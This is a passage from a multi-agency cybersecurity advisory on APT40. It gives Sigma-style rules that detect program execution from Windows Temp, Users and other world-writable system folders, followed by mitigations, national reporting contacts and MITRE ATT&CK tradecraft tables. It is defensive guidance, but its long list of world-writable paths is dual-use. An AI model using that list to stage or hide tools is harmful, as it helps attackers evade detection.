<p><strong>Description: </strong>Detect process execution from C:\\ Windows\\Temp.</p>
<p><strong>Background: </strong>This&nbsp;rule&nbsp;looks&nbsp;specifically&nbsp;for&nbsp;execution&nbsp;out&nbsp;of&nbsp;C:\\ Windows\\Temp\\*.&nbsp;Temp&nbsp;is&nbsp;more&nbsp;broadly&nbsp;used&nbsp;by benign applications and thus a lower confidence malicious&nbsp;indicator&nbsp;than&nbsp;execution&nbsp;out&nbsp;of&nbsp;other&nbsp;world&nbsp;writable subdirectories in C:\\Windows.</p>
<p>Removing applications executed by the SYSTEM or NETWORK SERVICE users substantially reduces the quantity of benign activity selected by this rule.</p>
<p>This&nbsp;means&nbsp;that&nbsp;the&nbsp;rule&nbsp;may&nbsp;miss&nbsp;malicious&nbsp;executions&nbsp;at&nbsp;a&nbsp;higher&nbsp;privilege&nbsp;level&nbsp;but&nbsp;it&nbsp;is&nbsp;recommended&nbsp;to use&nbsp;other&nbsp;rules&nbsp;to&nbsp;determine&nbsp;if&nbsp;a&nbsp;user&nbsp;is&nbsp;attempting&nbsp;to elevate privileges to SYSTEM.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such&nbsp;as&nbsp;the user&nbsp;context,&nbsp;execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate&nbsp;contextual&nbsp;process,&nbsp;network,&nbsp;file and other supporting data on the host to help&nbsp;make&nbsp;an&nbsp;assessment&nbsp;as&nbsp;to&nbsp;whether&nbsp;the&nbsp;activity&nbsp;is&nbsp;malicious.</li>
<li>If&nbsp;necessary&nbsp;attempt&nbsp;to&nbsp;collect&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;file&nbsp;for&nbsp;reverse&nbsp;engineering&nbsp;to&nbsp;determine&nbsp;whether&nbsp;it&nbsp;is&nbsp;legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:&nbsp;</strong>ASD’s ACSC</p>
<p><strong>Date:&nbsp;</strong>2024/06/19</p>
<p><strong>Status:&nbsp;</strong>experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log&nbsp;Source:</strong></p>
<p>category:&nbsp;process_creation<br>product:&nbsp;windows</p>
<p><strong>Detection:</strong></p>
<p>temp:<br>Image|startswith:&nbsp;'C:\\\\Windows\\\\Temp\\\\'</p>
<p>common_temp_path:<br>Image|re|ignorecase:&nbsp;'C:\\\\Windows\\\\Temp\\\\\\{[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}\\}\\\\'</p>
<p>system_user:<br>User:</p>
<ul>
<li>'SYSTEM'</li>
<li>'NETWORK&nbsp;SERVICE'</li>
</ul>
<p>dismhost:</p>
<ul>
<li>Image|endswith: 'dismhost.exe'&nbsp;</li>
</ul>
<p>known_parent:</p>
<ul>
<li>ParentImage|endswith:</li>
<li>'\\\\esif_uf.exe'&nbsp;</li>
<li>'\\\\vmtoolsd.exe'&nbsp;</li>
<li>'\\\\cwainstaller.exe'</li>
<li>'\\\\trolleyexpress.exe'</li>
</ul>
<p>condition: temp and not (common_temp_path or system_user or dismhost or known_parent)</p>
<p><strong>False positives:</strong></p>
<ul>
<li>Allowlist auditing applications have been observed running executables from Temp.</li>
<li>Temp will legitimately contain an array of setup applications and launchers, so it will be worth considering how prevalent this behavior is on a monitored network (and whether or not it can be allowlisted) before deploying this rule.</li>
</ul>
<p><strong>Level:</strong> low</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Non-Temp System Subdirectory</h5>
<p><strong>ID:</strong> 5b187157-e892-4fc9-84fc-aa48aff9f997</p>
<p><strong>Description:</strong> Detect process execution from a world writable location in a subdirectory of the Windows OS install location.</p>
<p><strong>Background:</strong></p>
<p>This rule looks specifically for execution out of world writable directories within C:\\ and particularly C:\\Windows\\*, with the exception of C:\\Windows\\Temp (which is more broadly used by benign applications and thus a lower confidence malicious indicator).</p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p>After completing an initial network baseline and identifying known benign executions from these locations, this rule should rarely fire.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56\" title=\"mattifestation / WorldWritableDirs.txt\">mattifestation / WorldWritableDirs.txt</a><br><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong></p>
<p>writable_path:<br>Image|contains:</p>
<ul>
<li>':\\\\$Recycle.Bin\\\\'</li>
<li>':\\\\AMD\\\\Temp\\\\'</li>
<li>':\\\\Intel\\\\'</li>
<li>':\\\\PerfLogs\\\\'</li>
<li>':\\\\Windows\\\\addins\\\\'</li>
<li>':\\\\Windows\\\\appcompat\\\\'</li>
<li>':\\\\Windows\\\\apppatch\\\\'</li>
<li>':\\\\Windows\\\\AppReadiness\\\\'</li>
<li>':\\\\Windows\\\\bcastdvr\\\\'</li>
<li>':\\\\Windows\\\\Boot\\\\'</li>
<li>':\\\\Windows\\\\Branding\\\\'</li>
<li>':\\\\Windows\\\\CbsTemp\\\\'</li>
<li>':\\\\Windows\\\\Containers\\\\'</li>
<li>':\\\\Windows\\\\csc\\\\'</li>
<li>':\\\\Windows\\\\Cursors\\\\'</li>
<li>':\\\\Windows\\\\debug\\\\'</li>
<li>':\\\\Windows\\\\diagnostics\\\\'</li>
<li>':\\\\Windows\\\\DigitalLocker\\\\'</li>
<li>':\\\\Windows\\\\dot3svc\\\\'</li>
<li>':\\\\Windows\\\\en-US\\\\'</li>
<li>':\\\\Windows\\\\Fonts\\\\'</li>
<li>':\\\\Windows\\\\Globalization\\\\'</li>
<li>':\\\\Windows\\\\Help\\\\'</li>
<li>':\\\\Windows\\\\IdentityCRL\\\\'</li>
<li>':\\\\Windows\\\\IME\\\\'</li>
<li>':\\\\Windows\\\\ImmersiveControlPanel\\\\'</li>
<li>':\\\\Windows\\\\INF\\\\'</li>
<li>':\\\\Windows\\\\intel\\\\'</li>
<li>':\\\\Windows\\\\L2Schemas\\\\'</li>
<li>':\\\\Windows\\\\LiveKernelReports\\\\'</li>
<li>':\\\\Windows\\\\Logs\\\\'</li>
<li>':\\\\Windows\\\\media\\\\'</li>
<li>':\\\\Windows\\\\Migration\\\\'</li>
<li>':\\\\Windows\\\\ModemLogs\\\\'</li>
<li>':\\\\Windows\\\\ms\\\\'</li>
<li>':\\\\Windows\\\\OCR\\\\'</li>
<li>':\\\\Windows\\\\panther\\\\'</li>
<li>':\\\\Windows\\\\Performance\\\\'</li>
<li>':\\\\Windows\\\\PLA\\\\'</li>
<li>':\\\\Windows\\\\PolicyDefinitions\\\\'</li>
<li>':\\\\Windows\\\\Prefetch\\\\'</li>
<li>':\\\\Windows\\\\PrintDialog\\\\'</li>
<li>':\\\\Windows\\\\Provisioning\\\\'</li>
<li>':\\\\Windows\\\\Registration\\\\CRMLog\\\\'</li>
<li>':\\\\Windows\\\\RemotePackages\\\\'</li>
<li>':\\\\Windows\\\\rescache\\\\'</li>
<li>':\\\\Windows\\\\Resources\\\\'</li>
<li>':\\\\Windows\\\\SchCache\\\\'</li>
<li>':\\\\Windows\\\\schemas\\\\'</li>
<li>':\\\\Windows\\\\security\\\\'</li>
<li>':\\\\Windows\\\\ServiceState\\\\'</li>
<li>':\\\\Windows\\\\servicing\\\\'</li>
<li>':\\\\Windows\\\\Setup\\\\'</li>
<li>':\\\\Windows\\\\ShellComponents\\\\'</li>
<li>':\\\\Windows\\\\ShellExperiences\\\\'</li>
<li>':\\\\Windows\\\\SKB\\\\'</li>
<li>':\\\\Windows\\\\TAPI\\\\'</li>
<li>':\\\\Windows\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\TextInput\\\\'</li>
<li>':\\\\Windows\\\\tracing\\\\'</li>
<li>':\\\\Windows\\\\Vss\\\\'</li>
<li>':\\\\Windows\\\\WaaS\\\\'</li>
<li>':\\\\Windows\\\\Web\\\\'</li>
<li>':\\\\Windows\\\\wlansvc\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Speech\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Tasks\\\\'</li>
</ul>
<p>appdata:<br>Image|contains:&nbsp;'\\\\AppData\\\\'<br>User:&nbsp;'SYSTEM'<br>condition:&nbsp;writable_path&nbsp;and&nbsp;not&nbsp;appdata</p>
<p><strong>False positives:</strong></p>
<p>Allowlist auditing applications have been observed running executables from these directories.</p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in one of these directories and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> high</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Users</h5>
<p><strong>ID:</strong> 6dda3843-182a-4214-9263-925a80b4c634</p>
<p><strong>Description:</strong> Detect process execution from C:\\Users\\Public\\* and other world writable folders within Users.</p>
<p><strong>Background:</strong></p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong><br>users:<br>Image|contains:</p>
<ul>
<li>':\\\\Users\\\\All Users\\\\'</li>
<li>':\\\\Users\\\\Contacts\\\\'</li>
<li>':\\\\Users\\\\Default\\\\'</li>
<li>':\\\\Users\\\\Public\\\\'</li>
<li>':\\\\Users\\\\Searches\\\\'</li>
</ul>
<p>appdata:<br>Image|contains: '\\\\AppData\\\\'<br>User: 'SYSTEM'<br>condition: users and not appdata</p>
<p><strong>False positives:</strong></p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in Public or a subdirectory and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> medium</p>
</td>
</tr>
</tbody>
</table>
<h3>Mitigations</h3>
<h5>Logging</h5>
<p>During ASD’s ACSC investigations, a common issue that&nbsp;reduces the effectiveness and speed of investigative efforts&nbsp;is&nbsp;a&nbsp;lack&nbsp;of&nbsp;comprehensive&nbsp;and&nbsp;historical&nbsp;logging&nbsp;information&nbsp;across&nbsp;a&nbsp;number&nbsp;of&nbsp;areas&nbsp;including web server request logs, Windows event logs&nbsp;and internet proxy logs.</p>
<p>ASD’s&nbsp;ACSC&nbsp;recommends&nbsp;reviewing&nbsp;and&nbsp;implementing their&nbsp;guidance&nbsp;on&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-monitoring/windows-event-logging-and-forwarding\" title=\"Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding\">Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding</a>&nbsp;including the configuration files and scripts&nbsp;in the&nbsp;<a href=\"http://www.github.com/Australiancybersecuritycentre/windows_event_logging/\" title=\"Windows Event Logging Repository\">Windows Event Logging Repository</a>&nbsp;and the Information&nbsp;Security&nbsp;Manual’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-monitoring\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring\">Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring</a>, to include centralizing logs and retaining&nbsp;logs for a suitable period.</p>
<h5>Patch&nbsp;Management</h5>
<p>Promptly patch all internet exposed devices and&nbsp;services,&nbsp;including&nbsp;web&nbsp;servers,&nbsp;web&nbsp;applications,&nbsp;and&nbsp;remote access gateways. Consider implementing a centralized patch management system to automate and expedite the process. ASD’s ACSC recommend implementation&nbsp;of&nbsp;the&nbsp;ISM’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-management\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Management\">Guidelines&nbsp;for&nbsp;System Management</a>, specifically, the System Patching&nbsp;controls where applicable.</p>
<p>Most exploits utilized by the actor were publicly known and had patches or mitigations available.</p>
<p>Organizations should ensure that security patches or mitigations&nbsp;are&nbsp;applied&nbsp;to&nbsp;internet&nbsp;facing&nbsp;infrastructure within 48 hours, and where possible, use the latest&nbsp;versions&nbsp;of&nbsp;software&nbsp;and&nbsp;operating&nbsp;systems.</p>
<h5>Network&nbsp;Segmentation</h5>
<p>Network segmentation can make it significantly more difficult for adversaries to locate and gain access to an organizations sensitive data. Segment networks to limit or block lateral movement by denying traffic between computers unless required. Important servers such as Active Directory and other authentication servers should only be able to be administered from a limited&nbsp;number of intermediary servers or “jump servers.” These servers should be closely monitored, be well secured&nbsp;and limit which users and devices are able to connect to&nbsp;them.</p>
<p>Regardless of instances identified where lateral movement is prevented, additional network&nbsp;segmentation&nbsp;could&nbsp;have&nbsp;further&nbsp;limited&nbsp;the amount&nbsp;of&nbsp;data&nbsp;the&nbsp;actors&nbsp;were&nbsp;able&nbsp;to&nbsp;access&nbsp;and&nbsp;extract.</p>
<h5>Additional Mitigations</h5>
<p>The&nbsp;authoring&nbsp;agencies&nbsp;also&nbsp;recommend&nbsp;the&nbsp;following mitigations to combat APT40 and others’ use of the&nbsp;TTPs&nbsp;below.</p>
<ul>
<li>Disable&nbsp;unused&nbsp;or&nbsp;unnecessary&nbsp;network&nbsp;services, ports&nbsp;and&nbsp;protocols.</li>
<li>Use&nbsp;well-tuned&nbsp;Web&nbsp;application&nbsp;firewalls&nbsp;(WAFs) to protect&nbsp;webservers&nbsp;and applications.</li>
<li>Enforce&nbsp;least privilege&nbsp;to limit&nbsp;access to&nbsp;servers,&nbsp;file shares, and other resources.</li>
<li>Use multi-factor authentication (MFA) and managed service accounts to&nbsp;make&nbsp;credentials harder to crack and reuse. MFA should be applied to&nbsp;all&nbsp;internet&nbsp;accessible&nbsp;remote&nbsp;access&nbsp;services,&nbsp;including:
<ul>
<li>Web&nbsp;and&nbsp;cloud-based&nbsp;email;</li>
<li>Collaboration&nbsp;platforms;</li>
<li>Virtual&nbsp;private&nbsp;network&nbsp;connections; and</li>
<li>Remote&nbsp;desktop&nbsp;services.</li>
</ul>
</li>
<li>Replace&nbsp;end-of-life&nbsp;equipment.</li>
</ul>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption>Mitigation Strategies/Techniques</caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>TTP</strong></th>
<th role=\"columnheader\"><strong>Essential&nbsp;Eight&nbsp;Mitigation&nbsp;Strategies</strong></th>
<th role=\"columnheader\"><strong>ISM&nbsp;Controls</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>Initial&nbsp;Access</p>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></p>
<p>Exploitation of Public-Facing Application</p>
</td>
<td>
<ul>
<li>Patch&nbsp;applications</li>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Application&nbsp;control</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1698</p>
<p>ISM-1701</p>
<p>ISM-1921</p>
<p>ISM-1876</p>
<p>ISM-1877</p>
<p>ISM-1905</p>
</td>
</tr>
<tr>
<td>
<p>Execution</p>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a></p>
<p>Command&nbsp;and&nbsp;Scripting Interpreter</p>
</td>
<td>
<ul>
<li>Application&nbsp;control</li>
<li>Restrict&nbsp;Microsoft&nbsp;Office&nbsp;macros</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1490</p>
<p>ISM-1622</p>
<p>ISM-1623</p>
<p>ISM-1657</p>
<p>ISM-1890</p>
</td>
</tr>
<tr>
<td>
<p>Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a></p>
<p>Server&nbsp;Software Component:&nbsp;Web&nbsp;Shell</p>
</td>
<td>
<ul>
<li>Application&nbsp;Control</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1246</p>
<p>ISM-1746</p>
<p>ISM-1249</p>
<p>ISM-1250</p>
<p>ISM-1490</p>
<p>ISM-1657</p>
<p>ISM-1871</p>
</td>
</tr>
<tr>
<td>
<p>Initial&nbsp;Access /&nbsp;Privilege Escalation&nbsp;/&nbsp;Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>
<p>Valid&nbsp;Accounts</p>
</td>
<td>
<ul>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
<li>Application&nbsp;control</li>
<li>User&nbsp;application&nbsp;hardening</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-0859</p>
<p>ISM-1546</p>
<p>ISM-1504</p>
<p>ISM-1679</p>
</td>
</tr>
</tbody>
</table>
<p>For additional general detection and mitigation advice, please consult the Mitigations and Detection sections on the MITRE ATT&amp;CK technique web page for each of the techniques identified in the MITRE ATT&amp;CK summary at the end of this advisory.</p>
<h2><strong>Reporting</strong></h2>
<p><strong>Australian organizations:</strong> visit <a href=\"https://www.cyber.gov.au/\" title=\"Australian Signals Directorate’s Australian Cyber Security Centre\">cyber.gov.au</a> or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.</p>
<p><strong>Canadian organizations:</strong> report incidents by emailing CCCS at <a href=\"mailto:contact@cyber.gc.ca\" title=\"Canadian Reporting\">contact@cyber.gc.ca</a>.</p>
<p><strong>New Zealand organizations:</strong> report cyber security incidents to <a href=\"mailto:incidents@ncsc.govt.nz\" title=\"New Zealand Reporting\">incidents@ncsc.govt.nz</a> or call 04 498 7654.</p>
<p><strong>United Kingdom organizations:</strong> report a significant cyber security incident at <a href=\"https://www.ncsc.gov.uk/section/about-this-website/contact-us\" title=\"United Kingdom Reporting\">National Cyber Security Centre</a> (monitored 24 hours) or, for urgent assistance, call 03000 200 973.</p>
<p><strong>U.S. organizations:</strong> report incidents and anomalous activity to CISA 24/7 Operations Center at <a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or (888) 282-0870 and/or to the FBI via your local FBI field office, the FBI’s 24/7 CyWatch at (855) 292-3937, or <a href=\"mailto:CyWatch@fbi.gov\" title=\"Report to FBI\">CyWatch@fbi.gov</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<h2><strong>MITRE ATT&amp;CK – Historical APT40 Tradecraft of Interest</strong></h2>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Reconnaissance (TA0043)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites [T1594] &nbsp;</td>
<td>Gather Victim Identity Information: Credentials [T1589.001]&nbsp;</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning [T1595.002]&nbsp;</td>
<td>Gather Victim Host Information [T1592]</td>
</tr>
<tr>
<td>Search Open Websites/Domains: Search Engines [T1593.002]</td>
<td>Gather Victim Network Information: Domain Properties [T1590.001]</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Email Addresses [T1589.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Resource Development (TA0042)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Domains [T1583.001] &nbsp;</td>
<td>Acquire Infrastructure [T1583]</td>
</tr>
<tr>
<td>Acquire Infrastructure: DNS Server [T1583.002] &nbsp;</td>
<td>Compromise Accounts [T1586]</td>
</tr>
<tr>
<td>Develop Capabilities: Code Signing Certificates [T1587.002]&nbsp;</td>
<td>Compromise Infrastructure [T1584]</td>
</tr>
<tr>
<td>Develop Capabilities: Digital Certificates [T1587.003]&nbsp;</td>
<td>Develop Capabilities: Malware [T1587.001]</td>
</tr>
<tr>
<td>Obtain Capabilities: Code Signing Certificates [T1588.003]</td>
<td>Establish Accounts: Cloud Accounts [T1585.003]</td>
</tr>
<tr>
<td>Compromise Infrastructure: Network Devices [T1584.008]</td>
<td>Obtain Capabilities: Digital Certificates [T1588.004]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Initial Access (TA0001)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Phishing [T1566]</td>
</tr>
<tr>
<td>Valid Accounts: Default Accounts [T1078.001] &nbsp;</td>
<td>Phishing: Spearphishing Attachment [T1566.001] &nbsp;</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002] &nbsp;</td>
<td>Phishing: Spearphishing Link [T1566.002]</td>
</tr>
<tr>
<td>External Remote Services [T1133]</td>
<td>Exploit Public-Facing Application [T1190]</td>
</tr>
<tr>
<td>Drive-by Compromise [T1189]&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Execution (TA0002)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows Management Instrumentation [T1047] &nbsp;</td>
<td>Command and Scripting Interpreter: Python [T1059.006]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Command and Scripting Interpreter: JavaScript [T1059.007]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Native API [T1106]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter [T1059] &nbsp;</td>
<td>Inter-Process Communication [T1559]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Windows Command Shell [T1059.003]&nbsp;</td>
<td>System Services: Service Execution [T1569.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: PowerShell [T1059.001]&nbsp;</td>
<td>Exploitation for Client Execution [T1203] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Visual Basic [T1059.005]&nbsp;</td>
<td>User Execution: Malicious File [T1204.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Unix Shell [T1059.004]</td>
<td>Command and Scripting Interpreter: Apple Script [T1059.002]</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003]</td>
<td>Software Deployment Tools [T1072]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Persistence (TA0003)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Server Software Component: Web Shell [T1505.003]&nbsp;</td>
</tr>
<tr>
<td>Office Application Startup: Office Template Macros [T1137.001]</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>External Remote Services [T1133]&nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003] &nbsp;</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
<td>Account Manipulation [T1098]</td>
<td>Valid Accounts: Cloud Accounts [T1078.004]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Privilege Escalation (TA0004)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>Exploitation for Privilege Escalation [T1068]</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft [T1134.001]</td>
<td>Event Triggered Execution: Unix Shell Configuration Modification [T1546.004]</td>
</tr>
<tr>
<td>Process Injection: Dynamic-link Library Injection [T1055.001]</td>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
</tr>
<tr>
<td>Valid Accounts: Local Accounts [T1078.003]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Defense Evasion (TA0005)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Rootkit [T1014]&nbsp;</td>
<td>Indirect Command Execution [T1202]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information [T1027] &nbsp;</td>
